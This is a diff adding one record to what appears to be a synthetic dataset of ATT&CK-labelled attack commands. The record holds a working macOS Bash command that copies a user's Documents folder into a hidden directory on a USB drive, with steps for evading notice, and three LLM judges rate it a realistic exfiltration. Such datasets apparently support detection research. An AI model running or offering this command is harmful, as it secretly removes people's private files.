@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/UNTITLED/.logs\" && cp -Rp \"$HOME/Documents\" \"/Volumes/UNTITLED/.logs/\"",
+  "explanation": "Copies the user's Documents directory to a hidden folder on a mounted USB drive to exfiltrate data via removable media.",
+  "rationale_steps": [
+    "Assume an external drive is mounted at /Volumes/UNTITLED.",
+    "Create a hidden destination directory on the USB to reduce casual discovery.",
+    "Recursively copy data while preserving timestamps and permissions to blend in.",
+    "Operate fully offline, avoiding any network transmission."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-36d8736b",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quotes, valid flags, proper use of &&, and correctly quoted paths.",
+        "semantic_score": 5,
+        "semantic_justification": "It creates a hidden directory on the mounted volume and copies the user's Documents there recursively, achieving exfiltration to removable media consistent with T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:26:47.092839Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags (-p for mkdir, -Rp for cp), proper use of && as a command separator, and correct use of environment variable expansion.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by creating a hidden directory (prefixed with '.') on a mounted USB volume (/Volumes/UNTITLED) and recursively copying the user's Documents folder to it, which is a realistic and operationally plausible method of exfiltrating data via removable media on macOS.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:39:23.647905Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, proper quoting for paths with variables, correct logical operators, and standard flags for the mkdir and cp utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the exfiltration technique by staging data in a hidden directory on a standard macOS mount point for removable media while preserving file metadata.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:39:25.588265Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
